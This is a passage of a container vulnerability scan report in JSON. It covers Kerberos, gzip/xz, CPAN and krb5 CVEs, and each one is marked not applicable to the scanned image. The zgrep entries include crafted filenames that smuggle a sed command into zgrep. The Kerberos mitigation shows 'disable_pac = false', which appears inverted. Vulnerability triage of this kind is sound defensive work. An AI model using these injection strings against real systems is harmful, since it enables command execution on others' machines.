            "FullDescription": "[MIT Kerberos](https://web.mit.edu/kerberos/) is a network authentication protocol that uses secret key cryptography to secure communications over a computer network. \n\n[Privilege Attribute Certificate](https://wiki.samba.org/index.php/Kerberos_PAC) (PAC) is a data structure that is used in the Kerberos network authentication protocol to store authorization data for a user. It is used to determine what resources a user is allowed to access and what actions they are allowed to perform. \n\nA PAC is typically embedded in a ticket that is issued by the Kerberos authentication server and passed to the client system when the user logs in. The client system uses the PAC to determine the user's permissions when the user attempts to access a resource.\n\nThe client system will send the ticket and the PAC to the resource server, which will use the information contained in the PAC to determine whether the user is allowed to access the resource. If the user is authorized, the resource server will grant access to the resource. If the user is not authorized, the resource server will deny access to the resource.\n\nThe Kerberos' PAC parser lacks a size check that prevents an integer overflow. A crafted PAC can either: \n- Cause a smaller-than-needed buffer allocation that will contain the PAC parsed data and can subsequently lead to a heap-buffer overflow which might lead to remote code execution (on 32-bit systems only),\n- Cause a bigger-than-needed buffer allocation which will lead to a read out-of-bounds and possible DoS.\n\nSince the PAC is parsed only after extraction from a decrypted ticket, the attacker needs to produce a ticket that the victim can decrypt. For that reason, among the services using Kerberos protocol, the Key Distribution Center (KDC) is an easy target as any authenticated attacker can print a ticket encrypted with their own long-term key and get the KDC to parse the PAC contained within. \n\n[A patch](https://github.com/krb5/krb5/commit/ea92d2f0fcceb54a70910fa32e9a0d7a5afc3583#diff-3d55ac988ef62053c69e7250eee0396116679f0d1327cc441c8d8f20501700b4) was released for the MIT Kerberos. \nSamba implements their own version of Kerberos library and released a [patch](https://download.samba.org/pub/samba/patches/security/samba-4.17.3-security-2022-11-15.patch).\nHeimdal also released a [patch](https://github.com/heimdal/heimdal/commit/d16a9db259c9d488fe8ab8622079c4ba6f9b760b).\n\nThis issue also impacts [Microsoft's Kerberos in Active Directory](https://www.samba.org/samba/security/CVE-2022-42898.html).",
            "Impact": 6,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Deployment mitigations\n\nPAC can be disabled in KDC configuration file (kdc.conf) for version 1.20+:\n```\n[kdcdefault]\n  disable_pac = false\n```",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attackers must send a Kerberos ticket that the victim can decrypt to get the PAC to be parsed.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                  "Description": "While MIT Kerberos's patch includes 2 PACs causing a DoS, there is no technical discussion or PoC that demonstrates exploiting the heap overflow (on 32-bit systems) for code execution",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Can lead to remote code execution on 32-bit systems",
                  "IsPositive": 0,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Heimdal's patch",
                  "Url": "https://github.com/heimdal/heimdal/commit/d16a9db259c9d488fe8ab8622079c4ba6f9b760b",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Samba's patch",
                  "Url": "https://download.samba.org/pub/samba/patches/security/samba-4.17.3-security-2022-11-15.patch",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Samba's advisory for their Kerberos implementation",
                  "Url": "https://www.samba.org/samba/security/CVE-2022-42898.html",
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "MIT Kerberos's patch, including PAC causing DoS",
                  "Url": "https://github.com/krb5/krb5/commit/ea92d2f0fcceb54a70910fa32e9a0d7a5afc3583#diff-3d55ac988ef62053c69e7250eee0396116679f0d1327cc441c8d8f20501700b4",
                  "InsertOrder": 4
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "cve_id": "CVE-2022-42898",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "Did not find a 32-bit Kerberos KDC executable (krb5kdc)",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "vulnerability_id": "CVE-2022-42898",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-203376",
         "severity": "High",
         "jfrog_severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "An arbitrary file write vulnerability was found in GNU gzip's zgrep utility. When zgrep is applied on the attacker's chosen file name (for example, a crafted file name), this can overwrite an attacker's content to an arbitrary attacker-selected file. This flaw occurs due to insufficient validation when processing filenames with two or more newlines where selected content and the target file names are embedded in crafted multi-line file names. This flaw allows a remote, low privileged attacker to force zgrep to write arbitrary files on the system.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:liblzma5",
         "source_id": "deb://debian:bullseye:liblzma5",
         "source_comp_id": "deb://debian:bullseye:liblzma5:5.2.5-2",
         "component_versions": {
            "id": "debian:bullseye:xz-utils",
            "vulnerable_versions": [
               "< 5.2.5-2.1~deb11u1"
            ],
            "fixed_versions": [
               "5.2.5-2.1~deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-1271",
                     "cwe": [
                        "CWE-20"
                     ],
                     "cwe_details": {
                        "CWE-20": {
                           "name": "Improper Input Validation",
                           "description": "The product receives input or data, but it does not validate or incorrectly validates that the input has the properties that are required to process the data safely and correctly.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "6"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "8.8/CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "An arbitrary file write vulnerability was found in GNU gzip's zgrep utility. When zgrep is applied on the attacker's chosen file name (for example, a crafted file name), this can overwrite an attacker's content to an arbitrary attacker-selected file. This flaw occurs due to insufficient validation when processing filenames with two or more newlines where selected content and the target file names are embedded in crafted multi-line file names. This flaw allows a remote, low privileged attacker to force zgrep to write arbitrary files on the system.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-02-15T12:36:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-203376",
            "VulnerabilityTitle": "",
            "ShortDescription": "An insufficient input validation in Gzip's zgrep and XZ Utils' xzgrep leads to arbitrary file overwrite when handling attacker-supplied filenames.",
            "FullDescription": "[GNU Gzip](https://www.gnu.org/software/gzip/) is a popular data compression program originally written by Jean-loup Gailly and Mark Adler.  `zgrep` is a script shipped with Gzip that `grep`s into compressed files (with compression formats that Gzip recognizes).\n\n[XZ Utils](https://tukaani.org/xz/) is free general-purpose data compression software with a high compression ratio. `xzgrep` is a script shipped with XZ Utils `grep`s into compressed files (with compression formats that XZ Utils recognizes).\n\nIt was discovered that when `zgrep` or `xzgrep` handles attacker-supplied filenames, the attacker may write arbitrary content to an arbitrary file. Since `zgrep` can invoke `sed` internally, If the system also contains GNU `sed`, code execution can be achieved (since crafted `sed` patterns can directly execute commands in GNU `sed`)\n\nFor example, the malicious filename `'|'$'\\n'';e cowsay -d pwned'$'\\n''#.gz'`, when `zgrep` attempts to parse the file name, the following things happen inside the script:\n\n* Only the last line is sanitized (removed), and the remaining lines are put into the variable `sed_script`, which now contains `s |^||; e  cowsay -d pwned`.\n* As the script continues and sed is invoked, the `s` command is skipped entirely, and the `e` command executes `cowsay -d pwned`.",
            "Impact": 6,
            "VulnerabilityType": "Arbitrary File Overwrite",
            "Resolution": "##### Deployment mitigations\n\nSanitize file names with `\\n` in them",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has a detailed technical explanation published, that can aid in exploit development",
                  "Description": "Public technical writeup explains the exploit with examples",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker must find be able to upload an unsanitized crafted file that will be used as a command-line argument to `zgrep` or `xzgrep`. For example - `zgrep '|'$'\\n'';e echo pwned'$'\\n''#.gz'`",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "In certain configurations can lead to remote code execution and/or local privilege escalation",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "Public PoC demonstrates arbitrary code execution, can be adjusted for arbitrary file overwrites",
                  "IsPositive": 0,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "xzgrep git commit",
                  "Url": "https://git.tukaani.org/?p=xz.git;a=commit;h=69d1b3fc29677af8ade8dc15dba83f0589cb63d6",
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Public exploit",
                  "Url": "https://www.openwall.com/lists/oss-security/2022/04/08/2",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Original advisory",
                  "Url": "https://www.zerodayinitiative.com/advisories/ZDI-22-619/#:~:text=ZDI%2DCAN%2D16587&text=This%20vulnerability%20allows%20remote%20attackers,vary%20depending%20on%20the%20implementation.",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "zgrep git commit",
                  "Url": "https://git.savannah.gnu.org/cgit/gzip.git/commit/?id=dc9740df61e575e8c3148b7bd3c147a81ea00c7c",
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical writeup & exploit",
                  "Url": "https://tech.buty4649.net/entry/2022/04/30/140608",
                  "InsertOrder": 5
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:liblzma5:5.2.5-2",
            "cve_id": "CVE-2022-1271",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable 'zgrep' or 'xzgrep' executables were not found in the filesystem",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:liblzma5:5.2.5-2",
            "vulnerability_id": "CVE-2022-1271",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-203376",
         "severity": "High",
         "jfrog_severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "An arbitrary file write vulnerability was found in GNU gzip's zgrep utility. When zgrep is applied on the attacker's chosen file name (for example, a crafted file name), this can overwrite an attacker's content to an arbitrary attacker-selected file. This flaw occurs due to insufficient validation when processing filenames with two or more newlines where selected content and the target file names are embedded in crafted multi-line file names. This flaw allows a remote, low privileged attacker to force zgrep to write arbitrary files on the system.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:gzip",
         "source_id": "deb://debian:bullseye:gzip",
         "source_comp_id": "deb://debian:bullseye:liblzma5:5.2.5-2",
         "component_versions": {
            "id": "debian:bullseye:gzip",
            "vulnerable_versions": [
               "< 1.10-4+deb11u1"
            ],
            "fixed_versions": [
               "1.10-4+deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-1271",
                     "cwe": [
                        "CWE-20"
                     ],
                     "cwe_details": {
                        "CWE-20": {
                           "name": "Improper Input Validation",
                           "description": "The product receives input or data, but it does not validate or incorrectly validates that the input has the properties that are required to process the data safely and correctly.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "6"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "8.8/CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "An arbitrary file write vulnerability was found in GNU gzip's zgrep utility. When zgrep is applied on the attacker's chosen file name (for example, a crafted file name), this can overwrite an attacker's content to an arbitrary attacker-selected file. This flaw occurs due to insufficient validation when processing filenames with two or more newlines where selected content and the target file names are embedded in crafted multi-line file names. This flaw allows a remote, low privileged attacker to force zgrep to write arbitrary files on the system.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-02-15T12:36:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-203376",
            "VulnerabilityTitle": "",
            "ShortDescription": "An insufficient input validation in Gzip's zgrep and XZ Utils' xzgrep leads to arbitrary file overwrite when handling attacker-supplied filenames.",
            "FullDescription": "[GNU Gzip](https://www.gnu.org/software/gzip/) is a popular data compression program originally written by Jean-loup Gailly and Mark Adler.  `zgrep` is a script shipped with Gzip that `grep`s into compressed files (with compression formats that Gzip recognizes).\n\n[XZ Utils](https://tukaani.org/xz/) is free general-purpose data compression software with a high compression ratio. `xzgrep` is a script shipped with XZ Utils `grep`s into compressed files (with compression formats that XZ Utils recognizes).\n\nIt was discovered that when `zgrep` or `xzgrep` handles attacker-supplied filenames, the attacker may write arbitrary content to an arbitrary file. Since `zgrep` can invoke `sed` internally, If the system also contains GNU `sed`, code execution can be achieved (since crafted `sed` patterns can directly execute commands in GNU `sed`)\n\nFor example, the malicious filename `'|'$'\\n'';e cowsay -d pwned'$'\\n''#.gz'`, when `zgrep` attempts to parse the file name, the following things happen inside the script:\n\n* Only the last line is sanitized (removed), and the remaining lines are put into the variable `sed_script`, which now contains `s |^||; e  cowsay -d pwned`.\n* As the script continues and sed is invoked, the `s` command is skipped entirely, and the `e` command executes `cowsay -d pwned`.",
            "Impact": 6,
            "VulnerabilityType": "Arbitrary File Overwrite",
            "Resolution": "##### Deployment mitigations\n\nSanitize file names with `\\n` in them",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has a detailed technical explanation published, that can aid in exploit development",
                  "Description": "Public technical writeup explains the exploit with examples",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker must find be able to upload an unsanitized crafted file that will be used as a command-line argument to `zgrep` or `xzgrep`. For example - `zgrep '|'$'\\n'';e echo pwned'$'\\n''#.gz'`",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "In certain configurations can lead to remote code execution and/or local privilege escalation",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "Public PoC demonstrates arbitrary code execution, can be adjusted for arbitrary file overwrites",
                  "IsPositive": 0,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "xzgrep git commit",
                  "Url": "https://git.tukaani.org/?p=xz.git;a=commit;h=69d1b3fc29677af8ade8dc15dba83f0589cb63d6",
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Public exploit",
                  "Url": "https://www.openwall.com/lists/oss-security/2022/04/08/2",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Original advisory",
                  "Url": "https://www.zerodayinitiative.com/advisories/ZDI-22-619/#:~:text=ZDI%2DCAN%2D16587&text=This%20vulnerability%20allows%20remote%20attackers,vary%20depending%20on%20the%20implementation.",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "zgrep git commit",
                  "Url": "https://git.savannah.gnu.org/cgit/gzip.git/commit/?id=dc9740df61e575e8c3148b7bd3c147a81ea00c7c",
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical writeup & exploit",
                  "Url": "https://tech.buty4649.net/entry/2022/04/30/140608",
                  "InsertOrder": 5
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:liblzma5:5.2.5-2",
            "cve_id": "CVE-2022-1271",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable 'zgrep' or 'xzgrep' executables were not found in the filesystem",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:liblzma5:5.2.5-2",
            "vulnerability_id": "CVE-2022-1271",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-190762",
         "severity": "High",
         "jfrog_severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "CPAN 2.28 allows Signature Verification Bypass.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:perl-base",
         "source_id": "deb://debian:bullseye:perl-base",
         "source_comp_id": "deb://debian:bullseye:perl-base:5.32.1-4+deb11u2",
         "component_versions": {
            "id": "debian:bullseye:perl",
            "vulnerable_versions": [
               "< 5.32.1-4+deb11u4"
            ],
            "fixed_versions": [
               "5.32.1-4+deb11u4"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2020-16156",
                     "cwe": [
                        "CWE-347"
                     ],
                     "cwe_details": {
                        "CWE-347": {
                           "name": "Improper Verification of Cryptographic Signature",
                           "description": "The product does not verify, or incorrectly verifies, the cryptographic signature for data."
                        }
                     },
                     "cvss_v2": "6.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
                     "cvss_v3": "7.8/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "CPAN 2.28 allows Signature Verification Bypass.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-02-25T21:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190762",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper validation logic in CPAN leads to signature validation bypass when installing a module from an untrusted CPAN mirror.",
            "FullDescription": "[CPAN](https://www.cpan.org/) (Comprehensive Perl Archive Network) is a repository of over 200,000 modules for the Perl programming language. \n\nTo install Perl modules from CPAN, users can use either the `cpan` client provided by [CPAN.pm](https://metacpan.org/dist/CPAN) (included in the Perl core) or the `cpanm` client provided by [cpanminus](https://metacpan.org/pod/App::cpanminus).\n\nWhen downloading a module, the cpan client retrieves a tarball with an encrypted `CHECKSUMS` file. The client generates its own local `CHECKSUMS` file for the downloaded file and compares it to the downloaded CHECKSUMS file. **By default**, the client only compares the `CHECKSUMS` files content but **does not validate the authenticity of the downloaded `CHECKSUMS` file**. To enable this option in cpan, the user can run the following command: `o conf check_sigs 1` and to make the changes persistent, run `o conf commit` after the first command.\n\nHowever, even when signature checking is enabled, there is a flaw in the `CHECKSUMS` file validation logic. An attacker can add a prepended checksum for a modified package to the beginning of the `CHECKSUMS` file, which will cause the `Module::Signature::_verify()` function to pass and trigger the installation even though the return code is `CANNOT_VERIFY`, which will be considered as `SIGNATURE_OK`.\n\nThis issue can be used to carry out supply chain attacks, as demonstrated in the [PoC](https://blog.hackeriet.no/cpan-signature-verification-vulnerabilities/). The attacker must create their own CPAN mirror, change the targeted module to add its malicious behaviors, calculate the new checksums from its files and add the calculated checksum to the beginning of the associated `CHECKSUMS` file.",
            "Impact": 6,
            "VulnerabilityType": "Authentication bypass",
            "Resolution": "##### Deployment mitigations\n\nUse the official CPAN HTTPS mirror, by running the following command `o conf urllist https://www.cpan.org` followed by `o conf commit` persist the configuration.",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "Adding a mirror server on CPAN is very unlikely to happen.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "The published PoC demonstrates how to calculate the new checksum and add it to the `CHECKSUMS` file of the module, allowing malicious code to be easily added.",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploiting the issue requires the user to interact with the vulnerable software",
                  "Description": "The user must add the untrusted mirror in the cpan mirror list and choose to install a module",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Untrusted code execution due to signature bypass",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has a detailed technical explanation published, that can aid in exploit development",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 5
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://github.com/andk/cpanpm/commit/b27c51adf0fda25dee84cb72cb2b1bf7d832148c",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Technical write-up with a PoC demonstrating a signature verification bypass using an attack-controlled mirror.",
                  "Url": "https://blog.hackeriet.no/cpan-signature-verification-vulnerabilities/",
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Perl official advisory with additional details.",
                  "Url": "https://blogs.perl.org/users/neilb/2021/11/addressing-cpan-vulnerabilities-related-to-checksums.html",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:perl-base:5.32.1-4+deb11u2",
            "cve_id": "CVE-2020-16156",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "This CVE is not applicable because not all requirements are found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:perl-base:5.32.1-4+deb11u2",
            "vulnerability_id": "CVE-2020-16156",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607812",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "In MIT Kerberos 5 (aka krb5) before 1.21.3, an attacker can modify the plaintext Extra Count field of a confidential GSS krb5 wrap token, causing the unwrapped token to appear truncated to the application.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libgssapi-krb5-2",
         "source_id": "deb://debian:bullseye:libgssapi-krb5-2",
         "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "< 1.18.3-6+deb11u5"
            ],
            "fixed_versions": [
               "1.18.3-6+deb11u5"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-37370",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "In MIT Kerberos 5 (aka krb5) before 1.21.3, an attacker can modify the plaintext Extra Count field of a confidential GSS krb5 wrap token, causing the unwrapped token to appear truncated to the application.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-607812",
            "VulnerabilityTitle": "",
            "ShortDescription": "A design problem in Kerberos 5 may lead to an authentication bypass when parsing crafted GSS wrap tokens.",
            "FullDescription": "The `krb5` library is an implementation of the `Kerberos` Version 5 protocol, which is a widely used authentication protocol that provides secure authentication over insecure networks. The library contains the tools, APIs, and utilities necessary for applications and systems to integrate Kerberos for authentication and secure communication.\n\n`GSS tokens` are part of the Generic Security Services Application Program Interface (GSS-API) used to provide secure communication between applications. A `GSS wrap token` is essentially a chunk of data that encapsulates encrypted data required for authentication, integrity, and confidentiality during Kerberos communication.\n\nIn MIT Kerberos 5 (aka krb5), attackers can craft the plaintext `Extra Count` field of a confidential GSS krb5 wrap token, causing the unwrapped token to appear truncated to the application.\nIn a truncation attack, the attacker somehow craft the message to indicate the message has finished in a way that will prevent the recipient picking up the rest of the message. This kind of attacks may lead to authentication bypass but rely heavily on the attacker ability to MiTM.\n\nThe general structure of a wrap token contains a header which includes the `Extra Count` field and an encrypted part which includes the message.\nA wrap token with a different value of `Extra Count` field between the plaintext and encrypted copies will be erroneously accepted, which allows a message truncation attack.\n\nThe wrap token header structure is similar to:\n```\nTOK_ID      : 2 byte\nFlags       : 1 byte\nFiller      : 1 byte\nExtra Count : 2 byte\nRRC         : 2 byte\n// Data (Encrypted)\n```\n\nTo successfully exploit this vulnerability the attacker will have to override the RRC field and the encrypted data in a way which will cause the receiving application think it got all of the message. This may lead to several issues, from authentication bypass to DoS.",
            "Impact": 5,
            "VulnerabilityType": "Authentication bypass",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The attacker must be able to intercept the communication between the application and the server (performing a man-in-the-middle attack) and be able to modify the token.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Can lead to an authentication bypass.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Official fix commit",
                  "Url": "https://github.com/krb5/krb5/commit/55fbf435edbe2e92dd8101669b1ce7144bc96fef",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "cve_id": "CVE-2024-37370",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "vulnerability_id": "CVE-2024-37370",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607812",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
